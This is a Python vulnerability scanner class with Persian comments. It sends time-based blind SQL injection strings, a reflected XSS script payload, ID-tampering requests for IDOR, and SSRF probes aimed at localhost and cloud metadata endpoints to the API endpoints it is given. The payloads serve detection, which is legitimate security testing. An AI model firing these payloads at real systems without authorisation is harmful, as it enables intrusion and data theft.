import requests
import json
import time
from urllib.parse import urljoin, urlencode

class APIScanner:
    def __init__(self, base_url, endpoints, session=None, delay=0.2):
        self.base_url = base_url.rstrip('/')
        self.endpoints = endpoints   # لیست رشته‌های "METHOD /path"
        self.session = session or requests.Session()
        self.delay = delay
        self.vulnerabilities = []
        self.vuln_set = set()

    def add_vuln(self, vuln_type, url, severity, detail=""):
        key = f"{vuln_type}:{url}"
        if key in self.vuln_set:
            return
        self.vuln_set.add(key)
        self.vulnerabilities.append({
            "type": vuln_type,
            "url": url,
            "severity": severity,
            "detail": detail
        })

    def _request(self, method, url, params=None, json_data=None, headers=None):
        time.sleep(self.delay)
        try:
            if method == "GET":
                return self.session.get(url, params=params, headers=headers, timeout=10)
            elif method == "POST":
                return self.session.post(url, params=params, json=json_data, headers=headers, timeout=10)
            elif method == "PUT":
                return self.session.put(url, params=params, json=json_data, headers=headers, timeout=10)
            elif method == "DELETE":
                return self.session.delete(url, params=params, headers=headers, timeout=10)
            elif method == "PATCH":
                return self.session.patch(url, params=params, json=json_data, headers=headers, timeout=10)
            else:
                return None
        except Exception as e:
            print(f"[API ERROR] {method} {url}: {e}")
            return None

    def scan(self, log_callback):
        for ep in self.endpoints:
            parts = ep.strip().split(maxsplit=1)
            if len(parts) != 2:
                log_callback(f"[API] Skipping invalid endpoint: {ep}")
                continue
            method, path = parts[0].upper(), parts[1]
            full_url = urljoin(self.base_url + "/", path.lstrip('/'))
            log_callback(f"[API] Testing {method} {full_url}")

            # 1. تست SQLi (time‑based)
            self.test_sqli(method, full_url, log_callback)
            # 2. تست XSS (reflected در پاسخ JSON)
            self.test_xss(method, full_url, log_callback)
            # 3. تست IDOR (افزایش/کاهش شناسه عددی)
            self.test_idor(method, full_url, log_callback)
            # 4. تست SSRF (از طریق پارامترهای url)
            self.test_ssrf(method, full_url, log_callback)

        return self.vulnerabilities

    # ------------------------------------------------------------
    # SQL INJECTION (time‑based blind)
    # ------------------------------------------------------------
    def test_sqli(self, method, url, log_callback):
        time_payloads = [
            ("' OR SLEEP(5)--", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("' OR pg_sleep(5)--", 5),
        ]
        # اندازه‌گیری زمان درخواست عادی
        normal_resp = self._request(method, url)
        normal_time = 0
        if normal_resp:
            normal_time = normal_resp.elapsed.total_seconds()
        else:
            return

        for payload, delay_sec in time_payloads:
            # تست در پارامترهای GET
            start = time.time()
            resp = self._request(method, url, params={"id": payload})
            elapsed = time.time() - start
            if resp and elapsed >= (normal_time + delay_sec - 1):
                self.add_vuln(
                    "SQL Injection",
                    url,
                    "Critical",
                    f"Time‑based blind SQLi via GET param 'id' with {payload} (delay {elapsed:.1f}s)"
                )
                return

            # تست در JSON body برای POST/PUT/PATCH
            if method in ["POST", "PUT", "PATCH"]:
                json_body = {"id": payload, "user": payload}
                start = time.time()
                resp = self._request(method, url, json_data=json_body)
                elapsed = time.time() - start
                if resp and elapsed >= (normal_time + delay_sec - 1):
                    self.add_vuln(
                        "SQL Injection",
                        url,
                        "Critical",
                        f"Time‑based blind SQLi via JSON body with {payload} (delay {elapsed:.1f}s)"
                    )
                    return

    # ------------------------------------------------------------
    # XSS (reflected in JSON response)
    # ------------------------------------------------------------
    def test_xss(self, method, url, log_callback):
        payload = "<script>alert('XSS')</script>"
        # تست در پارامترهای GET
        resp = self._request(method, url, params={"q": payload})
        if resp and payload in resp.text:
            self.add_vuln("Reflected XSS", url, "High", f"GET param q={payload} reflected in response")

        # تست در JSON body
        if method in ["POST", "PUT", "PATCH"]:
            json_body = {"q": payload, "search": payload}
            resp = self._request(method, url, json_data=json_body)
            if resp and payload in resp.text:
                self.add_vuln("Reflected XSS", url, "High", f"JSON body with {payload} reflected")

    # ------------------------------------------------------------
    # IDOR (Insecure Direct Object Reference)
    # ------------------------------------------------------------
    def test_idor(self, method, url, log_callback):
        # سعی می‌کند شناسه‌های عددی را تغییر دهد
        import re
        # اگر URL شامل عددی مثل /users/123 باشد
        match = re.search(r'/(\d+)', url)
        if match:
            original_id = match.group(1)
            # تست شناسه‌های مجاور
            for new_id in [str(int(original_id)+1), str(int(original_id)-1), "1"]:
                if new_id == original_id:
                    continue
                modified_url = url.replace(original_id, new_id)
                resp = self._request(method, modified_url)
                if resp and resp.status_code == 200:
                    self.add_vuln(
                        "IDOR",
                        modified_url,
                        "High",
                        f"Accessing {modified_url} returned 200 (original ID {original_id})"
                    )
                    return  # فقط یک گزارش کافی است

        # همچنین تست پارامترهای GET مثل ?id=123
        if "id=" in url or "user_id=" in url:
            # تغییر مقدار id
            for new_id in ["1", "2", "999"]:
                modified_url = re.sub(r'(id|user_id)=(\d+)', rf'\1={new_id}', url)
                if modified_url == url:
                    continue
                resp = self._request(method, modified_url)
                if resp and resp.status_code == 200:
                    self.add_vuln(
                        "IDOR",
                        modified_url,
                        "High",
                        f"Parameter tampering: {modified_url} returned 200"
                    )
                    return

    # ------------------------------------------------------------
    # SSRF (Server-Side Request Forgery)
    # ------------------------------------------------------------
    def test_ssrf(self, method, url, log_callback):
        ssrf_payloads = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
        ]
        ssrf_signatures = ["ami-id", "instance-id", "computeMetadata", "root:x:"]

        for payload in ssrf_payloads:
            # تست پارامترهای GET مانند ?url=
            resp = self._request(method, url, params={"url": payload})
            if resp:
                for sig in ssrf_signatures:
                    if sig in resp.text:
                        self.add_vuln(
                            "SSRF",
                            url,
                            "Critical",
                            f"SSRF via param url={payload} matched '{sig}'"
                        )
                        return
            # تست JSON body
            if method in ["POST", "PUT", "PATCH"]:
                json_body = {"url": payload, "callback": payload}
                resp = self._request(method, url, json_data=json_body)
                if resp:
                    for sig in ssrf_signatures:
                        if sig in resp.text:
                            self.add_vuln(
                                "SSRF",
                                url,
                                "Critical",
                                f"SSRF via JSON body with {payload} matched '{sig}'"
                            )
                            return